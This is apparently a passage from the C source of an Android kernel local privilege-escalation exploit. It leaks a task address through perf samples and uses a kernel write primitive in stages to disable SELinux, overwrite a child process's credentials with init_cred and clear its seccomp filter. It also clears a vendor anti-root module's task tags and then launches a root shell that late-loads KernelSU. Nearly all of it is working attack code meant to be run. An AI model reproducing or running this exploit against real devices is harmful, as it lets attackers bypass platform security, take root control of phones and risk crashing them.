    pr_warning("write root script failed errno=%d\n", errno);
  }
  close(sfd);
  chmod(g_root_script_path, 0755);
}

static int kernelsu_module_loaded(void) {
  FILE *modules = fopen("/proc/modules", "r");
  if (!modules) return 0;

  char line[256];
  int loaded = 0;
  while (fgets(line, sizeof(line), modules)) {
    char name[64];
    if (sscanf(line, "%63s", name) == 1 && strcmp(name, "kernelsu") == 0) {
      loaded = 1;
      break;
    }
  }
  fclose(modules);
  return loaded;
}

/* Find a task through perf sample records. */
/* Decoupling plan: discover a victim task address via perf samples. Inputs:
 * VictimContext/profile; output: address/error. Future:
 * victim_discover_task(VictimContext *, uintptr_t *). */
static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("perf_event_open failed errno=%d\n", errno);
    return 0;
  }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    pr_warning("perf mmap failed errno=%d\n", errno);
    close(fd);
    return 0;
  }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256]; int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
          v |= 0x0fULL << 56;
          if (in_direct_map(v))
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uintptr_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  return best;
}

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

/* rooted exits kfree the static init_cred (w2 stores it with no
 * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
/* Decoupling plan: retain a rooted child that references the credential.
 * Input: VictimContext policy; output: non-returning parked state. Future:
 * victim_park_rooted_child(const VictimContext *). */
static void park_rooted_child(void) {
  FILE *f = fopen("/proc/self/oom_score_adj", "w");
  if (f) {
    fputs("-1000", f);
    fclose(f);
  }
  for (;;) pause();
}

/* Decoupling plan: execute the victim command protocol and root handoff.
 * Input: owned pipe endpoints plus runtime config; output: reports/child exit.
 * Future: victim_child_run(VictimContext *), with explicit fd ownership. */
static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  setpgid(0, 0);  /* own group; the parent kills the whole tree on timeout */
  fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);  /* keep the probe pipe out of the
                                          * root shell / ksud chain */
  prctl(PR_SET_NAME, "ghostleaf_0123456789");
  /* a real leak reproduces, a fluke vote winner does not. w2 writes to
   * this address, so two runs must agree or the leak is discarded. */
  uintptr_t my_task = perf_find_task();
  int leak_agreed = 0;
  for (int i = 0; i < 2 && my_task; i++) {
    uintptr_t again = perf_find_task();
    if (again == my_task) { leak_agreed = 1; break; }
    my_task = again;
  }
  if (!leak_agreed) my_task = 0;
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  if (!my_task) _exit(1);
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
    else if (cmd == 'F') {
      /* Forked finit_module probe after W3 cleared TIF_SECCOMP and
       * seccomp.mode: mode==2 re-arms TIF_SECCOMP on fork (probe hits the
       * filter); mode==0 lets it run filter-free to a normal errno. Forked
       * so SIGSYS costs only this. */
      uint32_t code = 0xffffffff;
      int probe_pipe[2];
      if (pipe(probe_pipe) == 0) {
        pid_t probe = fork();
        if (probe == 0) {
          close(probe_pipe[0]);
          /* Forked probe: keep default SIGSYS so the filter kills it. */
          signal(SIGSYS, SIG_DFL);
          errno = 0;
          long r = syscall(__NR_finit_module, 0, 0, 0);
          uint32_t out = (r == 0) ? 0 : (uint32_t)errno;
          ssize_t nw = write(probe_pipe[1], &out, sizeof(out));
          (void)nw;
          _exit(0);
        }
        close(probe_pipe[1]);
        int st = 0;
        if (waitpid(probe, &st, 0) == probe && WIFEXITED(st)) {
          ssize_t nr = read(probe_pipe[0], &code, sizeof(code));
          if (nr != (ssize_t)sizeof(code)) code = 0xfffffffe;
        } else {
          code = 0xfffffffd; /* probe killed by a signal (SIGSYS) */
        }
        close(probe_pipe[0]);
      }
      write(p->uid_w, &code, sizeof(code));
    }
    else if (cmd == 'M') {
      /* Report comm length + first byte to tell which side a leaf=1 write
       * landed: comm "ghostleaf_012345" zeroed at [target] reads len 0, at
       * [target+8] len 8, untouched len 15. */
      char comm[24] = {0};
      FILE *cf = fopen("/proc/self/comm", "r");
      if (cf) {
        size_t n = fread(comm, 1, sizeof(comm) - 1, cf);
        (void)n;
        fclose(cf);
      }
      size_t len = strlen(comm);
      while (len > 0 && comm[len - 1] == '\n') {
        comm[len - 1] = 0;
        len--;
      }
      uint32_t report =
        ((uint32_t)len << 8) | (uint32_t)(unsigned char)comm[0];
      write(p->uid_w, &report, sizeof(report));
    }
    else if (cmd == 'P' || (cmd == 'X' && getuid() == 0)) {
      /* w2 rooted this task; park */
      close(p->cmd_r);
      close(p->uid_w);
      park_rooted_child();
    }
    else if (cmd == 'G') break;
    /* X retires a task w2 rooted without starting the root script. a rooted
     * exit drops the init_cred ref w2 never took, so it parks above. */
    else if (cmd == 'X') _exit(1);
  }
  close(p->cmd_r);
  if (getuid() != 0) { close(p->uid_w); _exit(1); }
  /* Don't leak app-side fds into the root shell chain: ksud/zygisk
   * daemons must not keep their write ends open. */
  for (int fd = 3; fd < 1024; fd++) {
    int fl = fcntl(fd, F_GETFD);
    if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
  }
  /* the script appends to this path, a leftover reads as this run's result */
  unlink(g_ksu_log_path);
  pid_t worker = fork();
  if (worker == 0) {
    /* Detach into a brand-new session: the independent root shell owns the
     * whole chain (ksud late-load + module watch) and must survive the
     * exploit parent killing this group on timeout. */
    if (setsid() < 0) _exit(1);
    execl("/system/bin/sh", "sh", g_root_script_path, NULL);
    _exit(1);
  }
  if (worker < 0) {
    pr_warning("fork() for root shell failed errno=%d; parking rooted child\n", errno);
    close(p->uid_w);
    park_rooted_child();
  }
  /* the worker holds a fresh cred copy; this task holds the raw init_cred */
  close(p->uid_w);
  park_rooted_child();
}

/* Decoupling plan: create the victim process and pipe protocol. Input/output:
 * VictimContext; output: owned PID/error. Future: victim_context_spawn(). */
static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  int *raised[6] = {&p->task_r, &p->task_w, &p->cmd_r,
                    &p->cmd_w,  &p->uid_r,  &p->uid_w};
  int *raw[6] = {&p1[0], &p1[1], &p2[0], &p2[1], &p3[0], &p3[1]};
  for (int i = 0; i < 6; i++) {
    *raised[i] = raise_pipe_fd(*raw[i]);
    if (*raised[i] < 0) return -1;
  }
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

/* Fork the victim and read back the task pointer perf leaked. */
/* Decoupling plan: spawn a victim and obtain its task address. Inputs:
 * VictimContext/output address; output: PID/error. Future:
 * victim_context_prepare(VictimContext *, uintptr_t *). */
static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
  pid_t child = spawn_child(p);
  if (child < 0) return -1;
  uintptr_t task = 0;
  ssize_t nr = read(p->task_r, &task, sizeof(task));
  close(p->task_r);
  *task_out = (nr == (ssize_t)sizeof(task)) ? task : 0;
  return child;
}

typedef int (*write_stage_verify_fn)(void *context);

/* Decoupling plan: run retry, repair and verification policy for one W stage.
 * Inputs: ExploitSession, StageDescriptor and verify callback; output:
 * StageStatus. Future: exploit_stage_run(), while route execution remains
 * single-attempt and route-neutral. */
static int retry_write_stage(
    const char *stage, uintptr_t target, int mode, int attempts,
    useconds_t settle_usec, write_stage_verify_fn verify, void *context,
    int leaf) {
  const WriteRequest request =
      write_request_make(target, (WriteMode)mode, leaf);
  for (int attempt = 1; attempt <= attempts; attempt++) {
    pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
    /* the previous attempt's write can land after its verify read; check
     * before paying for another heap spray */
    if (attempt > 1 && verify(context)) return 1;
    if (attempt == 1) slab_drain();
    if (mode == 2 && kernel5_route_selected()) {
      const WriteRequest repair_request = write_request_make(
          data_addr(g_init_cred_image) + 8, WRITE_MODE_ZERO, 1);
      page_base = prepare_good_kernel_page(&repair_request);
      if (!page_base || !stash_prebuilt_page()) {
        pr_warning("W2 fast repair prebuild failed\n");
        discard_prebuilt_page();
        return 0;
      }
      pr_info("W2 fast repair payload prebuilt\n");
    }
    int routed = do_one_write(&request, stage);
    if (!routed) {
      discard_prebuilt_page();
      pr_warning("%s attempt %d route failed; backing off\n", stage, attempt);
      usleep(100000);
      continue;
    }
    if (mode == 2 && kernel5_route_selected()) {
      /* Swap to the already sprayed leaf payload and repair static init_cred
       * immediately, avoiding another multi-second collision search while
       * PID 1 shares the corrupted credential. */
      if (!activate_prebuilt_page()) {
        pr_warning("W2 fast repair activation failed\n");
        return 0;
      }
      const WriteRequest repair_request = write_request_make(
          data_addr(g_init_cred_image) + 8, WRITE_MODE_ZERO, 1);
      pr_info("W2b: firing prebuilt init_cred+8 repair\n");
      atomic_store(&fast_repair_route, 1);
      int repaired = run_main_route_threads(&repair_request);
      atomic_store(&fast_repair_route, 0);
      if (!repaired) {
        pr_warning("W2 fast repair route failed\n");
        return 0;
      }
    }
    if (settle_usec) usleep(settle_usec);
    if (verify(context)) return 1;
    usleep(50000);
  }
  /* the last write can land after its verify read */
  return verify(context);
}

/* Decoupling plan: verify the SELinux stage. Input: verification context;
 * output: boolean/status. Future: stage_verify_selinux(const StageContext *). */
static int verify_selinux_stage(void *context) {
  (void)context;
  if (!check_selinux_off()) return 0;
  pr_success("SELinux permissive\n");
  return 1;
}

struct w2_stage_context {
  struct child_pipes *pipes;
};

struct w3_stage_context {
  struct child_pipes *pipes;
  int leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
};

/* Decoupling plan: verify victim credentials through its protocol. Input:
 * W2 context; output: boolean/status. Future: stage_verify_credentials(). */
static int verify_w2_stage(void *context) {
  struct w2_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "C", 1) != 1) return 0;

  uint32_t child_uid = 9999;
  if (read(stage->pipes->uid_r, &child_uid, sizeof(child_uid)) !=
      (ssize_t)sizeof(child_uid)) {
    return 0;
  }
  pr_info("child uid = %u\n", child_uid);
  if (child_uid != 0) return 0;
  pr_success("child is root!\n");
  return 1;
}

/* Decoupling plan: verify the victim seccomp stage. Input: victim context;
 * output: boolean/status. Future: stage_verify_seccomp(). */
static int verify_seccomp_probe_stage(void *context) {
  struct w2_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "F", 1) != 1) return 0;

  uint32_t code = 0;
  if (read(stage->pipes->uid_r, &code, sizeof(code)) !=
      (ssize_t)sizeof(code)) {
    return 0;
  }
  pr_info("seccomp finit_module probe = 0x%x\n", code);
  /* SIGSYS (0xfffffffd) = filter kills; EPERM/ENOSYS = its RET_ERRNO actions.
   * With init_cred + permissive SELinux a real probe fails with a normal
   * errno instead. */
  if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
      code == 1 || code == 38) {
    return 0;
  }
  pr_success("child seccomp filter bypassed (finit_module errno=%u)\n", code);
  return 1;
}

/* Decoupling plan: determine select-stack leaf write direction. Input: W3
 * context; output: verified direction/status. Future:
 * select_stack_verify_leaf_direction(), storing result in its route context. */
static int verify_leaf_dir_stage(void *context) {
  struct w3_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "M", 1) != 1) return 0;

  uint32_t report = 0;
  if (read(stage->pipes->uid_r, &report, sizeof(report)) !=
      (ssize_t)sizeof(report)) {
    return 0;
  }
  size_t len = (report >> 8) & 0xff;
  unsigned char c0 = (unsigned char)(report & 0xff);
  pr_info("leaf dir probe comm_len=%u comm[0]=%02x\n", (unsigned)len, c0);
  if (len == 8) {
    stage->leaf_to_target8 = 1;
    pr_info("leaf=1 write lands on [target+8]\n");
    return 1;
  }
  if (len == 0) {
    stage->leaf_to_target8 = 0;
    pr_info("leaf=1 write lands on [target]\n");
    return 1;
  }
  if (len == 15) {
    pr_warning("leaf dir probe: comm untouched (write missed the comm field)\n");
    return 0;
  }
  pr_warning("leaf dir probe ambiguous (len=%u c0=%02x)\n", (unsigned)len, c0);
  return 0;
}

/* Decoupling plan: top-level lifecycle and W1/W2/W3 orchestration. Inputs:
 * argv/environment snapshot; output: stable process exit code. Future:
 * exploit_session_run(ExploitSession *), delegating profile, heap, race, route,
 * victim and cleanup responsibilities to their contexts. */
int run_exploit(int argc, char **argv) {
  const char *profile_path = NULL;
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--profile") == 0 && i + 1 < argc) {
      profile_path = argv[++i];
    } else {
      pr_error("usage: %s --profile <resolved-profile.json>\n", argv[0]);
      return 1;
    }
  }
  if (!profile_path) {
    pr_error("missing required --profile <resolved-profile.json>\n");
    return 1;
  }
  disable_rseq_for_thread();
  set_unbuffer();
  signal(SIGPIPE, SIG_IGN);
  set_limit();
  reserve_standard_io();
  if (runtime_config_init(&g_runtime_config) != 0) {
    pr_error("runtime configuration failed errno=%d\n", errno);
    return 1;
  }
  runtime_config_log(&g_runtime_config);
  write_root_script();

  if (!active_offsets && select_offsets(profile_path) < 0) return 1;

  apply_iomem_cache();
  log_startup_context();
  init_p0_profile();
  pin_to_core(CORE);
  pr_info("main thread running on cpu=%d\n", sched_getcpu());

  timer_reset();
  TIMER("exploit start");

  if (g_runtime_config.multicast_phase1_probe) {
    if (!kernel5_route_selected()) {
      pr_error("5.x phase-1 probe requested for a non-5.x profile\n");
      return 1;
    }
    pr_info("5.x phase-1 probe: cycle/stamp/adjust/disarm only\n");
    int ok = kernel5_resident_start();
    if (ok) kernel5_resident_stop();
    pr_info("5.x phase-1 probe result=%s\n", ok ? "pass" : "fail");
    return ok ? 0 : 1;
  }

  /* W1: disable SELinux before task discovery. untrusted_app may not be able
   * to read enforce while it is still enforcing, so attempt W1 regardless. */
  int selinux_ok = check_selinux_off();
  if (!selinux_ok) {
    if (!enforce_readable()) {
      pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
    }
    TIMER("pre-W1 drain");
    int w1_attempts = (kernel5_route_selected() &&
                       !g_runtime_config.multicast_resident_enabled) ? 1 : 15;
    selinux_ok = retry_write_stage(
        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, w1_attempts, 100000,
        verify_selinux_stage, NULL, 0);
    if (!selinux_ok) {
      pr_warning("Write 1 failed\n");
      kernel5_resident_stop();
      return 1;
    }
    if (kernel5_route_selected() &&
        !g_runtime_config.multicast_resident_enabled) {
      uintptr_t w1_scratch_poison =
          page_base + active_offsets->mcast_buffer_size;
      if (!quarantine_reclaim_sockets()) {
        pr_warning("W1 scratch page quarantine failed\n");
        return 1;
      }
      int repaired = 0;
      for (int repair_try = 1; repair_try <= 3; repair_try++) {
        pr_info("W1b: private scratch repair attempt %d/3\n", repair_try);
        const WriteRequest scratch_repair = write_request_make(
            w1_scratch_poison, WRITE_MODE_ZERO, 1);
        if (do_one_write(&scratch_repair, "W1b: private scratch repair")) {
          repaired = 1;
          break;
        }
        usleep(50000);
      }
      if (repaired) {
        pr_success("private scratch repaired; releasing quarantine\n");
        release_quarantined_reclaim_sockets();
      } else {
        pr_warning("private scratch repair failed; keeping page quarantined\n");
        return 1;
      }
    }
    if (kernel5_route_selected() &&
        g_runtime_config.multicast_resident_enabled) {
      uintptr_t repair =
          (data_addr(KIMAGE_TEXT_BASE + active_offsets->off_mcast_fake_bss) +
           active_offsets->mcast_fake_lock_offset)
                         & ~(uintptr_t)0x1fffff;
      if (!kernel5_resident_write(data_addr(SELINUX_ENFORCING) + 4, repair)) {
        pr_warning("W1 policycap repair failed\n");
        kernel5_resident_stop();
        return 1;
      }
    }
    TIMER("Write 1 complete");
    if (g_runtime_config.w1_only) {
      pr_success("W1-only diagnostic complete\n");
      return 0;
    }
  } else {
    pr_success("SELinux already permissive\n");
  }

  /* W2: overwrite the child credential via the task leaked by perf. */
  slab_drain();
  TIMER("pre-W2 drain");

  struct child_pipes pipes;
  struct w2_stage_context w2_context = { .pipes = &pipes };
  pid_t child = -1;
  uintptr_t child_task = 0;
  int child_alive = 1;
  int seccomp_ok = 0;
  int ever_rooted = 0;
  pid_t parked_child = -1;
  int parked_cmd_w = -1;

  /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
   * child, so respawn and redo. */
  for (int round = 1; round <= 3; round++) {
    if (round > 1) {
      pr_warning("W3 chain retry %d/3: parking rooted child\n", round);
      if (child > 0 && child_alive) {
        write(pipes.cmd_w, "P", 1);
        usleep(50000);
        parked_child = child;
        parked_cmd_w = pipes.cmd_w;
      } else {
        close(pipes.cmd_w);
      }
      close(pipes.uid_r);
      child_alive = 1;
      seccomp_ok = 0;
    }

    child = spawn_victim(&pipes, &child_task);
    if (child < 0) {
      pr_warning("fork failed\n");
      return 1;
    }
    TIMER("perf_find_task done");

    if (!child_task) {
      /* nothing rooted yet; safe to kill and burn a round */
      pr_warning("perf leak did not reproduce; retrying next round\n");
      kill(-child, SIGKILL);
      waitpid(child, NULL, 0);

      child_alive = 0;
      close(pipes.cmd_w); close(pipes.uid_r);
      continue;

    }

    pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
    #ifdef VR_TAG_A_OFF
  /* ------------------------------------------------------------------
   * vivo vr.ko anti-root per-task bypass (ported from root.c)
   * ------------------------------------------------------------------
   * vr.ko tags every app-origin task at fork/clone time. When the task
   * later holds euid 0, the sys_exit tracepoint probe kills it. We must
   * strip the tag BEFORE W2 verify runs the child's getuid().
   *
   * This exploit primitive is 64-bit granular, so:
   *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
   *     clears the VR_SYSCALL_TP_FLAG bit (0x400). This takes the task
   *     off the sys_exit slow-path immediately.
   *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
   *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
   *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
   * ------------------------------------------------------------------ */
  {
    static int vr_needed = -1;
    if (vr_needed < 0) {
      vr_needed = 1; /* /proc/modules unreadable: assume loaded */
      FILE *m = fopen("/proc/modules", "r");
      if (m) {
        char mod[256];
        vr_needed = 0;
        while (fgets(mod, sizeof(mod), m))
          if (!strncasecmp(mod, "vr", 2) && (mod[2] == ' ' || mod[2] == '_'))
            { vr_needed = 1; break; }
        fclose(m);
      }
      pr_info("vr.ko %s\n", vr_needed ? "loaded; clearing tags"
                                      : "not loaded; skipping tag clear");
    }

    int vr_ok = 1;
    if (vr_needed) {
      /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
      const WriteRequest flags_request = write_request_make(
          child_task + TASK_THREAD_INFO_FLAGS_OFF, WRITE_MODE_ZERO, 1);
      vr_ok &= do_one_write(&flags_request, "VR: flags+tagA");

      /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
      if (vr_ok) {
        uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
        const WriteRequest tagb_request =
            write_request_make(tagb_align, WRITE_MODE_ZERO, 1);
        vr_ok &= do_one_write(&tagb_request, "VR: tagB");
      }

      if (vr_ok) {
        pr_success("VR.ko per-task tags cleared\n");
      } else {
        pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
      }
    }
  }
#endif

    int got_root = retry_write_stage(
        "W2: cred", child_task + TASK_CRED_OFF, 2, 15, 100000,
        verify_w2_stage, &w2_context, 0);
    if (!got_root) {
      write(pipes.cmd_w, "X", 1);
      close(pipes.cmd_w); close(pipes.uid_r);
      pr_warning("W2 failed after 15 rounds\n");
      waitpid(child, NULL, WNOHANG);
      return 1;
    }
    ever_rooted = 1;
    /* rooted children never exit; chain failures park (P) */

    /* W3: clear the child's seccomp filter for the independent root shell
     * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
     * must be zeroed too; do both writes back-to-back with one probe
     * (real finit_module calls trip vendor root guards).
     * tcp stamps *(target) exactly, so aim straight at thread_info.flags
     * (task+0) / seccomp.mode; only the pselect fallback needs the comm
     * probe to tell [target] from [target+8]. */
    if (!process_has_seccomp()) {
      pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
      seccomp_ok = 1;
      break;
    }

    int tcp_writes = tcp_route_selected();
    struct w3_stage_context w3_context = {
      .pipes = &pipes,
      .leaf_to_target8 = 0,
    };
    if (!tcp_writes) {
      /* a failed probe must not pick a side, guessing [target+8] would zero
       * the word before it, inside the task struct */
      if (!retry_write_stage(
              "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
              verify_leaf_dir_stage, &w3_context, 1)) {
        if (child_alive) {
          write(pipes.cmd_w, "X", 1);
          waitpid(child, NULL, WNOHANG);
          /* the next round takes over the pipe fds */
          child_alive = 0;
        }
        pr_warning("W3 leaf direction probe failed; not writing blind\n");
        continue;
      }
    }

    uintptr_t flags_target = w3_context.leaf_to_target8
      ? child_task - 8
      : child_task + TASK_THREAD_INFO_FLAGS_OFF;
    uintptr_t mode_target = w3_context.leaf_to_target8
      ? child_task + TASK_SECCOMP_OFF - 8
      : child_task + TASK_SECCOMP_OFF;

    for (int attempt = 1; attempt <= 6; attempt++) {
      pr_info("W3: TIF_SECCOMP+mode attempt %d/6\n", attempt);
      if (attempt == 1) slab_drain();
      const WriteRequest flags_request =
          write_request_make(flags_target, WRITE_MODE_ZERO, 1);
      int routed = do_one_write(&flags_request, "W3: TIF_SECCOMP");
      if (!routed) {
        pr_warning("W3 attempt %d route failed; backing off\n", attempt);
        usleep(100000);
        continue;
      }
      usleep(50000);
      const WriteRequest mode_request =
          write_request_make(mode_target, WRITE_MODE_ZERO, 1);
      routed = do_one_write(&mode_request, "W3: seccomp mode");
      if (!routed) {
        pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
        usleep(100000);
        continue;
      }
      usleep(50000);
      int st = 0;
      if (waitpid(child, &st, WNOHANG) == child) {
        pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
        child_alive = 0;
        break;
      }
      if (verify_seccomp_probe_stage(&w2_context)) {
        seccomp_ok = 1;
        break;
      }
      usleep(50000);
    }

    if (!seccomp_ok) {
      pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
      continue; /* respawn and redo the chain */
    }
    pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
    break;
  }

  if (!seccomp_ok)
    pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load will likely stay blocked\n");

  /* Let the repaired credential and reclaimed waiter state settle before the
   * rooted child reloads SELinux policy and late-loads KernelSU.  Dispatching
   * immediately regressed the proven 5.15 path: KernelSU loaded, then init
   * exited during policy recovery and the device panicked. */
  sleep(2);
  TIMER("exploit complete");
  if (!ever_rooted) {
    pr_error("w2 never rooted a child\n");
    return 1;
  }
  if (child_alive) {
    if (write(pipes.cmd_w, "G", 1) != 1)
      pr_warning("failed to start root shell (child exited early)\n");
    close(pipes.cmd_w);
    waitpid(child, NULL, WNOHANG);
    if (parked_cmd_w >= 0) close(parked_cmd_w);
  } else if (parked_child > 0) {
    if (write(parked_cmd_w, "G", 1) != 1)
      pr_warning("failed to start root shell (parked child exited)\n");
    close(parked_cmd_w);
    waitpid(parked_child, NULL, WNOHANG);
    parked_cmd_w = -1;
  } else {
    pr_warning("skipping late-load: child died during W3\n");
  }
  close(pipes.uid_r);

  int kernelsu_ready = 0;
  for (int i = 0; i < 30 && !(kernelsu_ready = kernelsu_module_loaded()); i++) {
    usleep(100000);
  }
  /* untrusted_app loses /proc/modules once enforcing is restored, so poll
   * the app-readable log for the loaded-module line (up to ~30s). */
  int ksu_log_loaded = 0;
  int ksu_log_failed = 0;
  for (int i = 0; i < 60 && !ksu_log_failed && !ksu_log_loaded; i++) {
    FILE *lf = fopen(g_ksu_log_path, "r");
    if (lf) {
      char line[256];
      while (fgets(line, sizeof(line), lf)) {
        if (strstr(line, "[+] KernelSU module loaded") ||
            strstr(line, "[+] kernelsu already loaded"))
          ksu_log_loaded = 1;
        if (strstr(line, "[!] KernelSU module not loaded")) ksu_log_failed = 1;
      }
      fclose(lf);
    }
    if (!ksu_log_failed && !ksu_log_loaded) usleep(500000);
  }
  kernelsu_ready = kernelsu_ready || ksu_log_loaded;
  /* enforcing takes the app dir away from the root script, so its log stops
   * before the restore. the state has to be read from here. */
  int enforced = 0;
  for (int i = 0; i < 20 && !(enforced = !check_selinux_off()); i++)
    usleep(500000);
  if (enforced)
    pr_success("enforcing restored\n");
  else
    pr_warning("SELinux left permissive\n");

  /* Fixup: permissive, load_policy, late-load. Module init re-enforces;
   * policy reload keeps it working after enforcing is back. */
  if (kernelsu_ready)
    pr_success("KernelSU ready\n");
  else if (ksu_log_failed)
    pr_warning("KernelSU module load failed\n");
  else if (seccomp_ok)
    pr_warning("temporary root ready; KernelSU module load pending\n");
  else
    pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
  kernel5_resident_stop();
  return 0;
}

/* Decoupling plan: native executable adapter. Inputs: argc/argv; output: stable
 * exit code. Future: remain a thin adapter around ExploitSession lifecycle. */
int main(int argc, char **argv) { return run_exploit(argc, argv); }
